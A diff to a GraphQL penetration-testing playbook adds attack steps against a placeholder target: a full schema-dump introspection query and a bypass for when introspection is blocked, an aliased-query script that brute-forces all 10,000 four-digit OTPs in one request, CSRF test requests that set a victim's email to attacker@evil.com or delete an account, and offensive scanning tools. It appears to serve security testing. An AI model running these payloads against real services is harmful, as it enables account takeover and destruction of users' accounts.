@@ -66,25 +66,54 @@ grep -rn "subscribe:\|Subscription:" --include="*.js" --include="*.ts" -A10
 
 ### Step 1 — Introspection check
 ```bash
-# Full introspection query
-curl -s -X POST https://target.com/graphql \
-  -H 'Content-Type: application/json' \
-  -d '{"query":"{__schema{types{name fields{name type{name kind ofType{name}}}}}}"}'
-
-# Simpler type list
+# Quick type list
 curl -s -X POST https://target.com/graphql \
   -H 'Content-Type: application/json' \
   -d '{"query":"{__schema{types{name}}}"}'
 
-# If blocked, try field suggestion bypass:
+# Full schema dump (queries, mutations, all fields + types):
+curl -s -X POST https://target.com/graphql \
+  -H 'Content-Type: application/json' \
+  -d '{"query":"query FullIntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }"}'
+# Pipe result into GraphQL Voyager (https://graphql-kit.com/graphql-voyager/) to visualize schema
+
+# If introspection blocked, try field suggestion bypass (Apollo server):
 curl -s -X POST https://target.com/graphql \
   -H 'Content-Type: application/json' \
   -d '{"query":"{__typ__ename}"}'
+# Or use clairvoyance (see TOOLS) to enumerate schema via suggestions
 ```
 
-### Step 2 — Batch query brute force
+### Step 2 — Rate limit bypass: aliased queries (same request, no array)
+
+GraphQL aliases let you call the same field/mutation multiple times in one request
+with different arguments — all processed in a single HTTP request, bypassing
+per-request rate limits:
+
+```graphql
+# OTP brute-force via aliases (single HTTP request, no batch array needed)
+{
+  a0001: verifyOtp(code: "0001") { success }
+  a0002: verifyOtp(code: "0002") { success }
+  a0003: verifyOtp(code: "0003") { success }
+  a0004: verifyOtp(code: "0004") { success }
+  # ... generate all 10000 aliases for 4-digit OTP
+}
+```
+
+```bash
+# Generate full OTP alias payload:
+python3 -c "
+import json
+queries = ' '.join([f'a{i:04d}: verifyOtp(code: \"{i:04d}\") {{ success }}' for i in range(10000)])
+print(json.dumps({'query': '{' + queries + '}'}))
+" | curl -s -X POST https://target.com/graphql \
+  -H 'Content-Type: application/json' -d @-
+```
+
+### Step 2b — Batch query brute force (array syntax)
 ```python
-# Batch 100 login attempts in one request (bypasses per-request rate limiting)
+# Batch multiple mutations in one request using JSON array syntax
 import json, requests
 
 batch = [
@@ -142,6 +171,26 @@ report only if query timeout is misconfigured and causes cascading DB load.
 }
 ```
 
+### Step 5b — CSRF in GraphQL
+
+GraphQL has no built-in CSRF protection. Exploitable when all four conditions hold:
+1. Sessions managed via cookies (not Authorization header)
+2. Mutation performs state-changing action
+3. No anti-CSRF token or special header required
+4. Content-Type does not trigger CORS preflight (`application/x-www-form-urlencoded` or `text/plain`)
+
+```bash
+# Test: does mutation work with form-encoded content-type?
+curl -s -X POST https://target.com/graphql \
+  -H "Cookie: session=VALID_SESSION" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d 'query=mutation{updateEmail(email:"attacker@evil.com"){success}}'
+
+# Test: GET-based mutation (worst case)
+curl -s "https://target.com/graphql?query=mutation{deleteAccount{success}}" \
+  -H "Cookie: session=VALID_SESSION"
+```
+
 ### Step 6 — Injection via arguments
 ```graphql
 # SQL injection in string argument
@@ -180,18 +229,28 @@ ws.onmessage = (e) => console.log(JSON.parse(e.data));
 ## TOOLS
 
 ```bash
-# InQL — Burp extension for GraphQL scanning
-# Download: https://github.com/doyensec/inql
+# InQL — Burp extension for GraphQL scanning (tabs, schema import, query builder)
+# Install from BApp Store or: https://github.com/doyensec/inql
 
 # graphw00f — fingerprint GraphQL server engine
 pip install graphw00f
 graphw00f -t https://target.com/graphql
 
-# clairvoyance — introspection via field suggestions (when introspection disabled)
+# clairvoyance — enumerate full schema via field suggestions (when introspection disabled)
 pip install clairvoyance
 clairvoyance -t https://target.com/graphql -w wordlist.txt
 
-# graphql-cop — automated security checks
+# graphql-cop — automated security checks (10+ tests including CSRF, introspection, DoS)
 pip install graphql-cop
 graphql-cop -t https://target.com/graphql
+
+# BatchQL — batch query and mutation testing
+git clone https://github.com/assetnote/batchql
+python3 batch.py -e https://target.com/graphql
+
+# Misconfig Mapper — detect GraphQL targets and common misconfigurations
+# https://github.com/intigriti/misconfig-mapper
+
+# GraphQL Voyager — visualize introspection result as interactive schema graph
+# https://graphql-kit.com/graphql-voyager/ (paste introspection JSON)
 ```
